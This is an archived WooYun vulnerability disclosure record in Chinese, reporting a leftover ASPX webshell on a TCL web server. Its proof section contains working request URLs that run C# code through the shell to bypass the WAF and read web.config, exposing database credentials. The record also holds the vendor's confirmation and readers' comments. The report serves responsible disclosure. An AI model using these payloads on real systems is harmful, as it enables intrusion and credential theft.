{"id": 71947, "wybug_id": "wooyun-2015-0150456", "wybug_title": "TCL某站shell一枚（此处应有WAF）", "wybug_corp": "TCL官方网上商城", "wybug_author": "wefgod", "wybug_date": "2015-10-29 21:41", "wybug_open_date": "2015-12-14 09:00", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向公众公开  简要描述： TCL某站的shell一枚……应该是上了某颜色公司的waf。顺便有一处疑似越权的页面，但是似乎做不了啥 详细说明：  这网站以前是绩效管理的……我曾经在我的漏洞里面提到过他现在不知道是用来干嘛的了   漏洞证明：  http://cts.tcl.com/后门地址：http://cts.tcl.com/admin/images/!.aspx直接用菜刀访问：\n\n经过其他一些测试，已经上了WAF，阻断哦，某些情况下可以看出这是某颜色公司的WAF特征换一个形式即可：http://cts.tcl.com/admin/images/!.aspx?w=Response.Write(HttpContext.Current.Server.MapPath(\"FileName\"));;Response.End();&z1=RDpcXFdlYlJvb3RcXGN0c1xc\n\n稍微绕一下waf，可以获取到web目录为：D:\\WebRoot\\cts\\获取web.config的内容：http://cts.tcl.com/admin/images/!.aspx?w=var m=new System.IO.StreamReader(\"D:/WebRoot/cts/web.config\",Encoding.Default);Response.Write(m.ReadToEnd());m.Close();Response.End();&z1=RDpcXFdlYlJvb3RcXGN0c1xc下图已经获取到数据库地址和密码\n\n数据库……sa/1？\n\n最后，貌似还有一个未授权访问？不过估计就是摆设哈http://cts.tcl.com/admin/index.html\n\n   修复方案：  删除此shell。未授权访问那个，根据实际情况看看   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-10-30 08:58 厂商回复： 该系统正在改造,准备升级后重新上线,但是主机上的木马没有删除,感谢您的提醒.谢谢对TCL的关注与关心. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-29 22:02 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:888 漏洞数:103        )\t\t \n  此处应有评论    \n     2015-10-29 22:03 |    \t\t林被甘霖老母草鸡摆 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 长得帅怪林被咯！)\t\t \n  green?    \n     2015-10-29 22:09 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:26        | 开发真是日了狗了)\t\t \n  绿色软件联盟？    \n     2015-10-29 22:21 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:12        | 我是一颗小小树)\t\t \n  少年，你要给颜色公司点颜色看看是嘛    \n     2015-10-29 22:39 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:569 漏洞数:89        | ®高级安全工程师 | WooYun认证√)\t\t \n  绿盟    \n     2015-10-29 22:57 |    \t\twefgod \t\t\t( 核心白帽子 |\t\t\t        Rank:1817 漏洞数:180        | 力不从心)\t\t \n  为什么那么多个TCL    \n     2015-10-29 22:58 |    \t\twefgod \t\t\t( 核心白帽子 |\t\t\t        Rank:1817 漏洞数:180        | 力不从心)\t\t \n  @f4ckbaidu 被你说对了xdowns    \n     2015-10-29 23:05 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:765 漏洞数:83        | 铁甲依然在)\t\t \n  哥,终于又来发洞了...    \n     2015-10-30 10:18 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  大哥上一次发洞，网易还没被异地登陆，乌云也不叫Ucloud    \n     2015-10-30 11:01 |    \t\twefgod \t\t\t( 核心白帽子 |\t\t\t        Rank:1817 漏洞数:180        | 力不从心)\t\t \n  @瘦蛟舞 为了核心……现在终于恢复身份    \n     2015-10-30 11:02 |    \t\twefgod \t\t\t( 核心白帽子 |\t\t\t        Rank:1817 漏洞数:180        | 力不从心)\t\t \n  @sco4x0 哈哈，不是大哥哈，我是小弟    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}